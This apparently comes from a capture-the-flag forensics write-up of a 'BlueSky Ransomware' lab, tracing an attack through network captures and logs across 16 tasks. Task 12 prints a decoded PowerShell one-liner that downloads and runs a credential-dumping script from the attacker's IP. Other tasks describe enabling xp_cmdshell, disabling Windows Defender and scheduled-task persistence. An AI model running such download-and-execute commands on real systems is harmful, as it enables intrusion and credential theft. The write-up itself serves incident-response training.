# BlueSky Ransomware Write up
## Task 1 *Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?*

A simple way to find this would be to analyze the network traffic (HTTP).

![[image1.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image1.png)

From looking at the HTTP traffic, you can see that there are PowerShell files with the origin IP of *87.96.21.84*

## Task 2 *During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?*

We can find this information by running the network log file through **NetworkMiner** and looking at the "Credentials" tab.


![[image2.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image2.png)

Showing the Username: *Sa*


## Task 3 *We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?*

Similarly to Task 2, we can find this information on **NetworkMiner** and by looking at the "Credentials Tab."


![[image3.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image3.png)

## Task 4 *Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?*

To find this we can look into network log using Network Miner's "Parameters" tab to find that the attackers enabled *[xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)*  in order to be able to spawn a windows command shell.


![[image4.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image4.png)


## Task 5 *Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?*

We can figure this out by looking into the Event Log file provided. Pretty early on, you will notice the usage of *winlogon.exe* 



## Task 6 *Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?*
We can find the downloads made through the network log provided. 
Filtering for HTTP protocol using Wireshark, you will find that there was a request to http://87.96.21.84/checking.ps1

![[image5.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image5.png)

## Task 7 *Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?*

Opening up the script file "checking.ps1" and investigating the functionality reveals that it checks for *S-1-5-32-544* 


![[image6.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image6.png)


## Task 8 *Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.* 
In order to find the registry keys used to disable Windows Defender we first have to find where in the script this is done.

After some investigating, you'll come across the function "Disable-WindowsDefender." Within this function, you'll find the registry keys.


![[image7.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image7.png)


## Task 9 *Can you determine the URL of the second file downloaded by the attacker?* 
We can easily find this similar to Task 6.


![[image8.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image8.png)

## Task 10 *Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?*

The first thing we need to do is identify where in the script the attacker utilizes **schtasks.exe** to create a task. After that, it is just a matter of analyzing it.


![[image9.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image9.png)


## Task 11 *According to your analysis of the second malicious file, what is the MITRE ID of the tactic the file aims to achieve?* 
Analyzing the code will show it terminating specific monitoring and security tools such as ProcessHacker and Promon. By doing so it allows the attacker to prevent detection. 


![[image15.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image15.png)

This type of behavior falls under the category *Defense Evasion (TA0005)"* and more specifically *Impair Defenses - Disable or Modify Tools (T1562.001)*


## Task 12 *What's the invoked PowerShell script used by the attacker for dumping credentials?*

To find this, we need to determine at what point in the script this is done. 

After some investigating, you'll come across an encoded variable that, when decoded, translates to :

*(New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1') | Invoke-Expression*

Exporting this script from the network log will give you a file used for post-exploitation dumping of credentials


![[image10.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image10.png)


## Task 13 *Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?* 

To find this, we simply need to find where these credentials are being stored/used in the script. 

You'll come across the variables "usernames," "passwordhashes," and "hashesContent"

Where the variable "hashesContent" holds the dumped credentials.


![[image11.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image11.png)

## Task 14 *Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?*

Going back to the network log, we can look through the files exported through the HTTP protocol. There, you'll come across the file named **extracted_hosts.txt**


![[image12.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image12.png)

## Task 15 *After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?*
We can analyze the ransomware behavior by utilizing malware sandboxes such as [VirusTotal](https://www.virustotal.com/gui/home/upload)

After [uploading](https://www.virustotal.com/gui/file/3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb/behavior) the file you can investigate the files it drops onto the system, There you'll find the ransom note.


![[image13.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image13.png)

## Task 16 *In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?*

Doing some digging through the VirusTotal analysis report will give you the ransomware family to which it belongs. 


![[image14.png]](https://github.com/Dunbird/CTF-Writeups/blob/main/BlueSky%20Ransomware/image14.png)

